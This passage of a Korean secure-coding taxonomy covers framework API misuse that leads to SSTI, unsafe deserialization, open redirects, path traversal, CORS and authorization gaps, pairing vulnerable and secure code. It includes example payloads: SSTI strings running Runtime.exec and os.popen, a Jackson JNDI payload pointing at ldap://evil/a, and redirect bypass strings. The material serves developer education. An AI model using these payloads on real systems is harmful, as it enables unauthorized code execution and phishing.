| **`protect_from_forgery except:`** | 특정 액션에 대해 CSRF 보호 면제 | API 호출용으로 면제했으나 쿠키 인증 가능한 브라우저 요청도 도달 | CSRF |
| **`protect_from_forgery with: :null_session`** | CSRF 토큰 불일치 시 세션을 null로 설정 — 예외 발생하지 않음 | 공격자가 의도적으로 빈 세션 상태를 유도 | CSRF |
| **Devise `authenticate_user!` 미적용** | 라우트에서 인증 필터를 빠뜨림 | 새 컨트롤러/액션 추가 시 필터 적용을 잊음 | AUTHZ |

### §4-3. Spring Security Decorator Wrappers

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`@PreAuthorize` SpEL 주입** | `@PreAuthorize("hasRole('" + userInput + "')")` — SpEL 표현식에 사용자 입력 보간 | 동적 권한 체크에서 문자열 결합 사용 | RCE |
| **Method Security vs URL Security 불일치** | `SecurityFilterChain`에서 URL을 `permitAll()`로 허용했지만 메서드 레벨에 `@Secured` 없음 (또는 그 반대) | URL 보안과 메서드 보안이 독립적으로 적용됨을 이해하지 못함 | AUTHZ |
| **`permitAll()` 순서 문제** | `http.authorizeRequests().antMatchers("/admin/**").permitAll()` 이 `authenticated()` 보다 먼저 매칭 | SecurityFilterChain의 규칙 순서가 first-match | AUTHZ |
| **`@Secured` vs `@RolesAllowed` vs `@PreAuthorize`** | 세 어노테이션이 별도 활성화 필요 — 하나만 활성화하고 다른 것을 사용하면 무시됨 | `@EnableMethodSecurity`가 `@Secured` 지원을 별도로 활성화해야 함 | AUTHZ |
| **`@PreAuthorize` 미평가** | `@EnableMethodSecurity` 없이 `@PreAuthorize` 사용 시 어노테이션이 완전히 무시됨 | 설정 누락으로 보안 어노테이션이 장식용이 됨 | AUTHZ |

```java
// VULNERABLE: @PreAuthorize가 활성화되지 않으면 무시됨
@Configuration
// @EnableMethodSecurity  ← 이것이 없으면 @PreAuthorize는 무효
public class SecurityConfig { ... }

@Service
public class AdminService {
    @PreAuthorize("hasRole('ADMIN')")  // 장식용! 실제로 체크하지 않음
    public void deleteUser(Long id) { ... }
}
```

### §4-4. Laravel Middleware Wrappers

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`$this->middleware('auth')->except()`** | `except` 목록이 과도하게 넓거나, 새 메서드 추가 시 except에 포함되지 않음을 기대했으나 실제로는 기본 포함 | except 목록 관리 실수 | AUTHZ |
| **미들웨어 순서** | `auth` 미들웨어가 `cors` 보다 먼저 실행되면 CORS preflight가 401 반환 | 미들웨어 스택 순서의 보안 함의를 모름 | AUTHZ |
| **Route-level vs Controller-level** | 라우트 파일에서 `->middleware('auth')`와 컨트롤러에서 `$this->middleware('auth')`가 중복되거나 충돌 | 두 위치의 미들웨어가 어떻게 결합되는지 모름 | AUTHZ |
| **Gate/Policy `before` 훅** | `Gate::before()` 콜백이 모든 권한 체크를 우회 — `return true`를 반환하면 모든 것이 허용 | 슈퍼유저 체크를 before에 넣고 실수로 모든 요청에 적용 | AUTHZ |

### §4-5. ASP.NET Auth Attribute Wrappers

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`[AllowAnonymous]` 우선순위** | `[AllowAnonymous]`가 `[Authorize]`를 오버라이드 — 하위 액션에서 전체 인증을 무효화 가능 | 클래스 레벨 `[Authorize]`에 액션 레벨 `[AllowAnonymous]` | AUTHZ |
| **`[IgnoreAntiforgeryToken]`** | CSRF 보호를 개별 액션/컨트롤러에서 비활성화 | API 엔드포인트에 면제했으나 브라우저 접근 가능 | CSRF |
| **`[Authorize(Roles = "...")]` 문자열** | 역할 이름이 문자열이라 오타가 컴파일 에러 없이 통과 — 해당 역할이 없으면 모든 사용자 거부 | 역할 문자열 오타 | AUTHZ |
| **Policy 기반 인가 미등록** | `[Authorize(Policy = "AdminOnly")]`에서 "AdminOnly" 정책이 등록되지 않으면 모든 요청 거부 또는 (설정에 따라) 모든 요청 허용 | 정책 등록 누락 | AUTHZ |

---

## §5. Template Rendering Wrappers

사용자 입력이 **템플릿 엔진의 평가 컨텍스트**에 도달하면 SSTI(Server-Side Template Injection)가 발생한다. §1의 Safety Marking과 달리, 여기서는 **템플릿 자체를 동적으로 구성/평가**하는 Wrapper가 대상이다.

### §5-1. Thymeleaf Expression Preprocessing `__${...}__`

Thymeleaf의 전처리(preprocessing) 표현식 `__${...}__`는 메인 표현식 평가 **이전에** SpEL을 먼저 평가한다. 이것이 SSTI의 핵심 진입점이다.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **뷰 이름 주입** | 컨트롤러가 `return "user/" + lang + "/welcome"` 형태로 사용자 입력을 뷰 이름에 포함 | `@ResponseBody` 없는 String 반환 컨트롤러 | RCE |
| **Fragment 표현식 주입** | `return "welcome :: " + section` — 프래그먼트 선택자에 사용자 입력 | 동적 프래그먼트 로딩 | RCE |
| **URI 기반 암묵적 뷰 이름** | `void` 반환 컨트롤러에서 `RequestToViewNameTranslator`가 URI를 뷰 이름으로 변환 | 명시적 뷰 이름 없이 URI 기반 해석 | RCE |

```java
// VULNERABLE: 사용자 입력이 뷰 이름에 포함
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document, Model model) {
    // void 반환 → URI가 뷰 이름으로 사용 → Thymeleaf가 SpEL 평가
}
// 공격: GET /doc/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x

// SECURE: @ResponseBody 또는 ResponseEntity 사용
@GetMapping("/doc/{document}")
@ResponseBody
public String getDocument(@PathVariable String document) {
    return documentService.getContent(document);
}
```

### §5-2. Rails `render` Family

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`render inline:`** | `render inline: params[:template]` — 사용자 입력을 ERB 템플릿으로 평가 (CVE-2016-2098) | 사용자 입력이 `inline:` 옵션에 전달 | RCE |
| **`render file:`** | `render file: params[:path]` — 서버 파일 시스템 읽기 (CVE-2019-5418) | 사용자 입력이 `file:` 옵션에 전달 | INFO |
| **`render template:`** | `render template: params[:page]` — 의도하지 않은 템플릿 렌더링 | 템플릿 경로를 사용자가 제어 | INFO, RCE |
| **동적 render 옵션** | `render params[:format] => params[:content]` — render 옵션 키 자체를 사용자가 제어 | 해시 형태의 render 호출에 사용자 입력 | RCE |

### §5-3. Spring `StandardEvaluationContext` vs `SimpleEvaluationContext`

SpEL(Spring Expression Language)을 평가할 때 사용하는 컨텍스트에 따라 접근 범위가 결정된다.

| Context | 접근 범위 | 안전성 |
|---------|----------|--------|
| `StandardEvaluationContext` | 전체 JVM — `T(java.lang.Runtime)`, 리플렉션, 클래스 로딩 모두 가능 | **RCE 가능** |
| `SimpleEvaluationContext` | 프로퍼티 접근, 단순 컬렉션 연산만 가능 — 타입 참조, 메서드 호출 차단 | 상대적 안전 |

```java
// VULNERABLE: StandardEvaluationContext (기본값)
ExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext ctx = new StandardEvaluationContext();
Expression exp = parser.parseExpression(userInput);
exp.getValue(ctx);  // RCE!

// SECURE: SimpleEvaluationContext
SimpleEvaluationContext ctx = SimpleEvaluationContext
    .forReadOnlyDataBinding()
    .build();
Expression exp = parser.parseExpression(userInput);
exp.getValue(ctx);  // 프로퍼티 읽기만 가능
```

### §5-4. Jinja2 (Flask) / Twig (Laravel) 동적 템플릿

| Framework | Wrapper | 메커니즘 | Impact |
|-----------|---------|---------|--------|
| **Flask/Jinja2** | `Template(user_string).render()` | 사용자 문자열을 Jinja2 템플릿으로 컴파일·실행 | RCE |
| **Flask/Jinja2** | `render_template_string(user_string)` | 위와 동일하지만 Flask 헬퍼로 래핑 | RCE |
| **Laravel/Twig** | `Twig::createTemplate($userString)->render()` | Twig 템플릿으로 사용자 문자열 평가 | RCE |

```python
# VULNERABLE: 사용자 입력을 템플릿으로 평가
from flask import render_template_string
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template_string(f'Hello {name}!')
    # name = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
    # → RCE

# SECURE: 사용자 입력을 컨텍스트 변수로 전달
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return render_template_string('Hello {{ name }}!', name=name)
```

---

## §6. Serialization Configuration Wrappers

프레임워크가 제공하는 직렬화/역직렬화 설정 Wrapper. **다형성 역직렬화**, **직렬화 포맷 선택**, **직렬화 대상 클래스 제한** 설정을 잘못 사용하면 RCE 직결.

### §6-1. Jackson `@JsonTypeInfo` / `enableDefaultTyping()`

Spring Boot의 기본 JSON 라이브러리인 Jackson은 다형성 역직렬화를 지원한다. 이를 활성화하면 JSON 페이로드에 클래스 이름을 포함시켜 임의 클래스를 인스턴스화할 수 있다.

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`enableDefaultTyping()`** | `ObjectMapper.enableDefaultTyping()` — 모든 Object 타입에 다형성 역직렬화 활성화 | 전역 ObjectMapper 설정 (CVE-2017-7525, CVE-2019-12384, CVE-2019-14379 등 다수) | RCE |
| **`@JsonTypeInfo(use=CLASS)`** | `@JsonTypeInfo(use = Id.CLASS)` — 특정 필드에 클래스 기반 다형성 활성화 | 도메인 객체에 다형성 타입 어노테이션 적용 | RCE |
| **`@JsonTypeInfo(use=MINIMAL_CLASS)`** | `Id.CLASS`의 약어 버전, 동일한 위험 | 같은 패키지 내 클래스로 제한되지만 gadget chain 여전히 가능 | RCE |
| **Gadget 클래스 활용** | `com.sun.rowset.JdbcRowSetImpl` (JNDI lookup), `org.apache.xalan.xsltc.trax.TemplatesImpl` (bytecode 실행) 등 | 클래스패스에 gadget 클래스 존재 (대부분의 Java 앱) | RCE |

```java
// VULNERABLE: 전역 다형성 역직렬화 활성화
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // 모든 Object 필드에 클래스 기반 역직렬화!

// 공격 페이로드:
// ["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName": "ldap://evil/a", "autoCommit": true}]

// SECURE: activateDefaultTyping + 검증기 사용 (Jackson 2.10+)
mapper.activateDefaultTyping(
    mapper.getPolymorphicTypeValidator(),
    DefaultTyping.NON_FINAL,
    JsonTypeInfo.As.PROPERTY
);
// 또는 다형성 역직렬화 자체를 사용하지 않기
```

**CVE 히스토리 (Jackson + enableDefaultTyping):**

| CVE | 연도 | Gadget Class | Impact |
|-----|------|-------------|--------|
| CVE-2017-7525 | 2017 | `JdbcRowSetImpl` → JNDI | RCE |
| CVE-2017-17485 | 2017 | `ClassPathXmlApplicationContext` | RCE |
| CVE-2019-12384 | 2019 | `EHCache JndiLookup` | RCE |
| CVE-2019-14379 | 2019 | `TemplatesImpl` bytecode | RCE |
| CVE-2020-36518 | 2020 | Deep nesting DoS | DoS |

### §6-2. Rails `ActiveRecord::Base.serialize` — YAML 역직렬화

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`serialize :col, YAML` (기본값)** | ActiveRecord가 칼럼 값을 YAML.load로 역직렬화 — 임의 Ruby 객체 생성 | 공격자가 DB 값을 직접 조작 가능 (SQLi 경유 등) (CVE-2022-32224) | RCE |
| **`serialize :col, JSON`** | JSON 직렬화 — 안전하지만 Ruby 객체 복원 불가 | JSON은 임의 객체 생성 불가 | 안전 |
| **`CookieStore` + Marshal** | `CookieStore`가 세션을 Marshal로 직렬화, `secret_key_base` 유출 시 RCE | secret_key_base 노출 (git 유출, 에러 페이지 등) | RCE |
| **`MessageVerifier` / `MessageEncryptor`** | `ActiveSupport::MessageVerifier`가 기본 직렬화로 Marshal 사용 | 서명 키 유출 시 페이로드 변조 가능 | RCE |

```ruby
# VULNERABLE: 기본 YAML 직렬화 (Rails < 7.1)
class User < ApplicationRecord
  serialize :preferences  # 기본 YAML — 위험!
end

# SECURE: JSON 직렬화 사용 (Rails 7.1+ 기본값)
class User < ApplicationRecord
  serialize :preferences, coder: JSON
end
```

### §6-3. Django `Signer` / `signing.dumps()` — Pickle 옵션

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`signing.dumps(obj, serializer=PickleSerializer)`** | Pickle 직렬화 + HMAC 서명 — SECRET_KEY 유출 시 RCE | SECRET_KEY 노출, Pickle serializer 명시적 사용 | RCE |
| **커스텀 세션 백엔드 Pickle** | 세션 데이터를 Pickle로 직렬화하는 커스텀 백엔드 | 세션 쿠키를 클라이언트가 조작 가능 | RCE |

---

## §7. Redirect Construction Wrappers

사용자 입력을 리다이렉트 대상 URL에 전달하는 패턴. 모든 프레임워크의 리다이렉트 Wrapper는 **URL을 검증하지 않고 그대로 Location 헤더에 삽입**한다.

### §7-1. Cross-Framework Redirect Misuse

| Framework | Wrapper | 취약 사용 | Impact |
|-----------|---------|----------|--------|
| **Django** | `HttpResponseRedirect()` | `HttpResponseRedirect(request.GET['next'])` | OR |
| **Django** | `redirect()` | `redirect(request.POST['url'])` | OR |
| **Rails** | `redirect_to` | `redirect_to params[:url]` | OR |
| **Rails** | `redirect_back` | `redirect_back fallback_location: params[:url]` | OR |
| **Spring** | `"redirect:" + url` | `return "redirect:" + userInput;` — 뷰 이름 해석에서 리다이렉트 | OR |
| **Spring** | `RedirectView` | `new RedirectView(userUrl)` | OR |
| **Laravel** | `redirect()->to()` | `return redirect()->to($request->input('url'))` | OR |
| **Laravel** | `redirect()->intended()` | 세션에 저장된 intended URL이 조작 가능할 때 | OR |
| **Express** | `res.redirect()` | `res.redirect(req.query.next)` | OR |
| **Flask** | `redirect()` | `redirect(request.args.get('next'))` | OR |
| **ASP.NET** | `Redirect()` | `return Redirect(returnUrl)` | OR |

### §7-2. 프레임워크 제공 검증 Wrapper의 우회 이력

| Framework | 검증 Wrapper | CVE | 우회 기법 |
|-----------|-------------|-----|----------|
| **Django** | `url_has_allowed_host_and_scheme()` (구 `is_safe_url()`) | CVE-2017-7233 | `http:///evil.com`, backslash `http:\\evil.com` |
| **Django** | 위와 동일 | CVE-2017-7234 | `//evil.com` (protocol-relative), `https:evil.com` |
| **Rails** | 내장 검증 없음 — 개발자가 직접 구현 | — | 검증 미구현이 가장 흔한 취약점 |
| **Spring** | 내장 검증 없음 | — | `redirect:` prefix가 프레임워크에 의해 자동 처리 |

**공통 우회 패턴:**
```
//evil.com                    → Protocol-relative URL
/\evil.com                    → Backslash confusion (일부 브라우저)
http://allowed.com@evil.com   → Authority confusion
javascript:alert(1)           → JavaScript scheme
data:text/html,...             → Data URI
%2f%2fevil.com                → URL-encoded //
/evil.com                     → 일부 브라우저에서 /를 //로 해석하는 edge case
```

---

## §8. File Serving Wrappers

프레임워크가 서버 파일을 클라이언트에 전송하는 Wrapper. 사용자가 **파일 경로를 제어**하면 Path Traversal.

### §8-1. Cross-Framework File Serving Misuse

| Framework | Wrapper | 취약 사용 | Impact |
|-----------|---------|----------|--------|
| **Django** | `FileResponse` | `FileResponse(open(os.path.join(BASE, user_path)))` | INFO, PT |
| **Django** | `serve()` (개발 전용) | 프로덕션에서 `django.views.static.serve` 사용 — 성능 및 보안 문제 | INFO |
| **Rails** | `send_file` | `send_file params[:path]` — 서버 파일 직접 전송 (CVE-2019-5418 연관) | INFO |
| **Rails** | `send_data` | Content-Type을 사용자가 제어 시 브라우저 해석 조작 | XSS |
| **Rails** | `ActiveStorage` redirect | `rails_blob_path(blob)` URL이 예측 가능하면 비인가 파일 접근 | INFO |
| **Laravel** | `Storage::download()` | `Storage::download($request->input('file'))` — 경로 검증 미실시 | INFO, PT |
| **Laravel** | `response()->file()` | `response()->file($path)` — 절대경로 주입 가능 | INFO, PT |
| **Spring** | `ResourceHttpRequestHandler` | 정적 리소스 핸들러의 Path Traversal (CVE-2024-38816, CVE-2024-38819) | INFO, PT |
| **Express** | `express.static()` | dotfiles 설정, symlink 추종, 디렉토리 리스팅 | INFO |
| **Express** | `res.sendFile()` | `res.sendFile(req.params.file)` — `root` 옵션 없이 사용 시 절대경로 접근 | INFO, PT |

### §8-2. Spring 정적 리소스 Path Traversal CVE 체인

| CVE | 연도 | 우회 기법 | 영향 |
|-----|------|----------|------|
| CVE-2024-38816 | 2024 | WebMvc.fn/WebFlux.fn 라우터 함수의 Path Traversal | 임의 파일 읽기 |
| CVE-2024-38819 | 2024 | Double URL encoding (`%252e%252e%252f`) 우회 | 임의 파일 읽기 |
| CVE-2024-38821 | 2024 | WebFlux URL 미정규화 인가 우회 | 인가 우회 |

---

## §9. CORS Configuration Wrappers

프레임워크가 제공하는 CORS 설정 Wrapper. **Origin 와일드카드와 Credentials의 조합**이 핵심 위험.

### §9-1. Cross-Framework CORS Misconfiguration

| Framework | Wrapper | 위험한 설정 | Impact |
|-----------|---------|-----------|--------|
| **Django** (django-cors-headers) | `CORS_ALLOW_ALL_ORIGINS` | `CORS_ALLOW_ALL_ORIGINS = True` + `CORS_ALLOW_CREDENTIALS = True` | CSRF-like 교차 출처 공격 |
| **Django** | `CORS_ALLOWED_ORIGIN_REGEXES` | 정규식 오류로 의도하지 않은 출처 허용 (예: `r"https://.*\.example\.com"` → `https://evil.example.com.attacker.com`) | 교차 출처 공격 |
| **Rails** (rack-cors) | `origins '*'` | `resource '*', origins: '*', credentials: true` — 하지만 브라우저가 `*` + credentials를 차단하므로, 서버가 요청 Origin을 그대로 반사하도록 구현할 때 문제 발생 | 교차 출처 공격 |
| **Spring** | `@CrossOrigin` | `@CrossOrigin(origins = "*")` — 컨트롤러/메서드 레벨 와일드카드 | INFO |
| **Spring** | `CorsConfiguration` | `config.addAllowedOrigin("*")` + `config.setAllowCredentials(true)` — Spring은 이 조합을 에러로 처리하므로, 개발자가 `addAllowedOriginPattern("*")`로 우회 | 교차 출처 공격 |
| **Express** (cors 패키지) | `cors()` | `cors({ origin: true, credentials: true })` — 모든 Origin을 요청의 Origin 헤더로 반사 | 교차 출처 공격 |
| **Laravel** | `HandleCors` | `'allowed_origins' => ['*']` + `'supports_credentials' => true` | 교차 출처 공격 |
| **ASP.NET** | `AddCors` | `.AllowAnyOrigin().AllowCredentials()` — .NET Core 3.0+에서 런타임 에러, 하지만 이전 버전은 허용 | 교차 출처 공격 |

**핵심 규칙:** `Origin: *` + `Credentials: true`는 대부분의 브라우저가 거부한다. 그래서 프레임워크들이 **요청의 Origin 헤더를 그대로 `Access-Control-Allow-Origin`에 반사**하는 패턴을 사용하게 되는데, 이것이 실질적 위험이다.

### §9-2. Origin 반사 패턴의 위험

```javascript
// VULNERABLE: 요청 Origin을 그대로 반사
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', req.headers.origin);
    res.header('Access-Control-Allow-Credentials', 'true');
    next();
});
// 모든 출처에서 인증된 요청 가능 → CSRF와 동일한 효과
```

---

## §10. Validation Wrapper Bypass

프레임워크가 제공하는 입력 검증 Wrapper의 구조적 우회. 검증이 **적용되지 않거나**, **불완전하거나**, **우회 가능한** 패턴.

### §10-1. Spring `@Valid` / `@Validated` 미적용

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **중첩 객체 @Valid 누락** | `@Valid` 없이 중첩 객체를 받으면 해당 객체의 Bean Validation이 실행되지 않음 | 중첩 DTO의 필드에 `@NotNull` 등이 있지만 부모에 `@Valid` 없음 | 검증 우회 |
| **BindingResult 무시** | `@Valid` 후 `BindingResult`를 받지만 에러를 확인하지 않고 진행 | 검증 에러가 예외 대신 BindingResult에 담김 | 검증 우회 |
| **@Validated groups 누락** | 그룹 기반 검증에서 적절한 그룹을 지정하지 않으면 해당 검증 규칙 미실행 | `@Validated(CreateGroup.class)` vs `@Validated` (기본 그룹만) | 검증 우회 |

```java
// VULNERABLE: 중첩 객체의 @Valid 누락
public class OrderDTO {
    @Valid  // ← 이것이 없으면 address의 검증이 실행되지 않음!
    private AddressDTO address;
}

// VULNERABLE: BindingResult 무시
@PostMapping("/order")
public String createOrder(@Valid OrderDTO dto, BindingResult result) {
    // result.hasErrors() 확인 안 함!
    orderService.create(dto);
}
```

### §10-2. Django Form `clean()` Override 실수

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **super().clean() 미호출** | `clean()` 오버라이드 시 `super().clean()` 호출을 빠뜨리면 필드 레벨 검증이 실행되지 않음 | 커스텀 clean 메서드에서 부모 호출 누락 | 검증 우회 |
| **Form vs Model 검증 갭** | Form에서 검증을 통과해도 Model의 `full_clean()`이 호출되지 않을 수 있음 | `form.save(commit=False)` 후 수동 저장 | 검증 우회 |
| **`clean_<field>` 미반환** | `clean_email()` 등이 정제된 값을 반환하지 않으면 None이 됨 | return 문 누락 | 데이터 손실 |

### §10-3. Rails Validation 우회

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`save(validate: false)`** | `user.save(validate: false)` — 모든 검증을 건너뜀 | 개발자가 성능을 위해 또는 특수 케이스에서 검증 비활성화 | 검증 우회 |
| **`update_column` / `update_columns`** | 콜백과 검증을 모두 건너뛰고 SQL 직접 실행 | Mass Update 시 검증 없이 DB 직접 변경 | 검증 우회 |
| **`allow_blank: true`** | `validates :token, presence: true, allow_blank: true` — presence와 allow_blank가 상호 모순 | 검증 규칙 옵션 조합의 의미 오해 | 검증 우회 |
| **numericality 오버플로우** | `validates :amount, numericality: true` — 매우 큰 수나 부동소수점 정밀도 문제 | 정수 오버플로우, IEEE 754 정밀도 | 로직 오류 |

### §10-4. Laravel Validation 우회

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **`sometimes` 규칙** | `'email' => 'sometimes|required|email'` — 필드가 요청에 없으면 검증을 건너뜀 | 공격자가 필드를 아예 전송하지 않음 | 검증 우회 |
| **`nullable` 남용** | `'token' => 'nullable|string'` — null 값이 허용됨 | 필수 필드에 nullable 적용 | 검증 우회 |
| **배열 검증 누락** | `'items' => 'required|array'` 만으로는 배열 내부 요소의 형식 미검증 | `'items.*' => 'required|string'` 누락 | 검증 우회 |
| **Form Request authorize()** | `authorize()` 메서드가 `return true`를 반환하면 모든 요청 허용 | 기본 scaffold가 `return true` 생성 | AUTHZ |

---

## Cross-Cutting Analysis: 메타 패턴 종합

### Meta-Pattern 1: "이름이 동작의 반대를 암시한다" (Semantic Inversion — F1)

가장 위험한 Wrapper 오용 패턴. 함수 이름이 개발자에게 **안전성을 보장한다는 인상**을 주지만, 실제로는 **안전 장치를 해제**하는 함수.

| Wrapper | 개발자 오해 | 실제 동작 |
|---------|-----------|----------|
| `html_safe` (Rails) | "이 HTML을 안전하게 만든다" | "이 문자열은 **이미** 안전하다고 **선언**한다 (이스케이프 비활성화)" |
| `mark_safe()` (Django) | "안전하게 마킹한다" | "이스케이프를 **건너뛰라고** 마킹한다" |
| `Arel.sql()` (Rails) | "SQL을 안전하게 래핑한다" | "이 문자열은 **이미** 안전한 SQL이라고 **선언**한다" |
| `bypassSecurityTrustHtml()` (Angular) | "보안을 신뢰할 수 있게 만든다" | "보안 검사를 **우회**한다" |

### Meta-Pattern 2: "Escape Hatch의 편의성이 남용을 유도한다" (Abstraction Escape Hatch Abuse — F4)

ORM, 템플릿 엔진, 데이터 바인딩은 모두 **안전한 기본 API**와 **원시 접근 escape hatch**를 병렬 제공한다. escape hatch는 복잡한 쿼리/렌더링을 위해 필요하지만, 사용자 입력이 들어가면 즉시 취약해진다.

| 안전한 기본 API | Escape Hatch | Failure |
|---------------|-------------|---------|
| `User.objects.filter(name=input)` | `User.objects.extra(where=[f"name='{input}'"])` | SQLi |
| `<%= var %>` | `<%= raw(var) %>` / `var.html_safe` | XSS |
| `@RequestBody DTO` | `@ModelAttribute DomainObj` | Mass Assignment |
| `SimpleEvaluationContext` | `StandardEvaluationContext` | RCE |
| `YAML.safe_load()` | `serialize :col` (YAML 기본) | RCE |

### Meta-Pattern 3: "데코레이터 미적용은 보호 부재와 같다" (Decorator Ordering/Scope Gap — F3)

선언적 보안 데코레이터는 **적용하지 않으면 존재하지 않는 것과 같다**. 그리고 적용해도 **순서와 범위**가 정확해야 한다.

| 프레임워크 | 미적용 시나리오 | 결과 |
|-----------|--------------|------|
| Spring | `@EnableMethodSecurity` 없이 `@PreAuthorize` 사용 | 어노테이션이 완전히 무시됨 |
| Django | CBV에 `@login_required` 직접 적용 (dispatch에 미적용) | 일부 HTTP 메서드 보호 누락 |
| Rails | 새 액션 추가 시 `before_action` 필터 미적용 | 인증 없이 접근 가능 |
| Laravel | `$this->middleware('auth')` except 목록 관리 실수 | 새 메서드에 인증 미적용 |
| ASP.NET | `[AllowAnonymous]`가 `[Authorize]`를 오버라이드 | 인증 완전 해제 |

### Meta-Pattern 4: "설정 기본값이 최대 개방이다" (Overpermissive Default — F2)

프레임워크 Wrapper의 기본값이 **최대 허용/최소 제한** 상태인 패턴.

| Wrapper | 기본값 | 안전한 값 |
|---------|--------|----------|
| `params.permit!` (Rails) | 모든 파라미터 허용 | `permit(:name, :email)` |
| `ModelForm fields='__all__'` (Django) | 모든 필드 노출 | `fields=['name', 'email']` |
| `$guarded = []` (Laravel) | 모든 속성 Mass Assignment 가능 | `$fillable = ['name', 'email']` |
| `enableDefaultTyping()` (Jackson) | 모든 Object에 다형성 역직렬화 | 비활성화 또는 PolymorphicTypeValidator |
| `StandardEvaluationContext` (SpEL) | 전체 JVM 접근 | `SimpleEvaluationContext` |
| `CORS_ALLOW_ALL_ORIGINS = True` (Django) | 모든 출처 허용 | 명시적 출처 목록 |

---

## 부록 A: Wrapper 오용 → CVE 매핑표

| CVE | 연도 | Framework | Wrapper | Failure Mode | Impact |
|-----|------|-----------|---------|-------------|--------|
| CVE-2022-22965 | 2022 | Spring | `@ModelAttribute` DataBinder | F2, F4 | RCE |
| CVE-2022-22963 | 2022 | Spring Cloud Function | `spring.cloud.function.routing-expression` 헤더 → SpEL | F4 | RCE |
| CVE-2022-22947 | 2022 | Spring Cloud Gateway | Actuator `/gateway/routes` → SpEL | F4 | RCE |
| CVE-2017-8046 | 2017 | Spring Data REST | PATCH 요청 → SpEL 표현식 평가 | F4 | RCE |
| CVE-2017-7525 | 2017 | Jackson | `enableDefaultTyping()` + `JdbcRowSetImpl` | F2 | RCE |
| CVE-2019-12384 | 2019 | Jackson | `enableDefaultTyping()` + EHCache | F2 | RCE |
| CVE-2022-32224 | 2022 | Rails | `ActiveRecord serialize` YAML 역직렬화 | F2 | RCE |
| CVE-2013-0156 | 2013 | Rails | XML 파라미터 → YAML 역직렬화 체인 | F4 | RCE |
| CVE-2016-2098 | 2016 | Rails | `render inline:` 사용자 입력 | F4 | RCE |
| CVE-2019-5418 | 2019 | Rails | `render file:` 경로 조작 | F4 | INFO |
| CVE-2024-53985 | 2024 | Rails | `sanitize` 헬퍼 우회 (noscript) | F3 | XSS |
| CVE-2017-7233 | 2017 | Django | `is_safe_url()` 우회 (backslash) | F3 | OR |
| CVE-2017-7234 | 2017 | Django | `is_safe_url()` 우회 (protocol-relative) | F3 | OR |
| CVE-2024-38816 | 2024 | Spring | `ResourceHttpRequestHandler` Path Traversal | F4 | INFO |
| CVE-2024-38819 | 2024 | Spring | 위와 동일 (Double encoding 우회) | F4 | INFO |
| CVE-2021-3129 | 2021 | Laravel Ignition | 디버그 모드 → 파일 조작 → RCE | F2 | RCE |
| CVE-2025-29927 | 2025 | Next.js | `x-middleware-subrequest` 헤더로 미들웨어 전체 우회 | F3 | AUTHZ |

---

## 부록 B: 프레임워크별 Quick Reference — "이것 대신 이것을 써라"

### Safety Marking

| Framework | 위험한 Wrapper | 안전한 대안 |
|-----------|--------------|-----------|
| Django | `mark_safe(f'<b>{input}</b>')` | `format_html('<b>{}</b>', input)` |
| Rails | `input.html_safe` / `raw(input)` | `content_tag(:b, input)` / `tag.b(input)` |
| Laravel | `{!! $input !!}` | `{{ $input }}` + Purifier 라이브러리 |
| Thymeleaf | `th:utext="${input}"` | `th:text="${input}"` |
| ASP.NET | `Html.Raw(input)` | `@input` (자동 이스케이프) |
| React | `dangerouslySetInnerHTML={{__html: input}}` | `DOMPurify.sanitize(input)` 후 사용 |
| Vue | `v-html="input"` | `{{ input }}` 또는 `DOMPurify.sanitize()` |
| Angular | `bypassSecurityTrustHtml(input)` | 기본 sanitizer 사용 유지 |

### ORM Queries

| Framework | 위험한 Wrapper | 안전한 대안 |
|-----------|--------------|-----------|
| Django | `extra(where=[f"x='{input}'"])` | `.filter(x=input)` |
| Django | `raw(f"SELECT ... {input}")` | `.raw("SELECT ... %s", [input])` |
| Rails | `where("x = '#{input}'")` | `where("x = ?", input)` / `where(x: input)` |
| Rails | `Arel.sql(input)` | `Arel.sql` 사용 금지 또는 정적 문자열만 |
| Laravel | `whereRaw("x = '$input'")` | `whereRaw("x = ?", [$input])` / `where('x', $input)` |
| Spring | `@Query` + 문자열 결합 | `@Query` + `:param` 바인딩 |

### Data Binding

| Framework | 위험한 Wrapper | 안전한 대안 |
|-----------|--------------|-----------|
| Spring | `@ModelAttribute DomainObj` | DTO + `@InitBinder` 허용필드 |
| Rails | `params.permit!` | `params.permit(:field1, :field2)` |
| Django | `ModelForm(fields='__all__')` | `ModelForm(fields=['f1', 'f2'])` |
| Laravel | `$guarded = []` | `$fillable = ['f1', 'f2']` |
| ASP.NET | 바인딩 제한 없음 | `[Bind("f1,f2")]` / ViewModel |

### Serialization Config

| Framework | 위험한 Wrapper | 안전한 대안 |
|-----------|--------------|-----------|
| Spring/Jackson | `enableDefaultTyping()` | 비활성화 / `PolymorphicTypeValidator` |
| Rails | `serialize :col` (YAML) | `serialize :col, coder: JSON` |
| Django | `signing.dumps(serializer=Pickle)` | `signing.dumps()` (JSON 기본값 유지) |

### Auth Decorators

| Framework | 위험한 Wrapper | 안전한 대안 |
|-----------|--------------|-----------|
| Spring | `@PreAuthorize` without `@EnableMethodSecurity` | 반드시 `@EnableMethodSecurity` 설정 |
| Django | `@login_required` on CBV 메서드 직접 | `@method_decorator(login_required, name='dispatch')` |
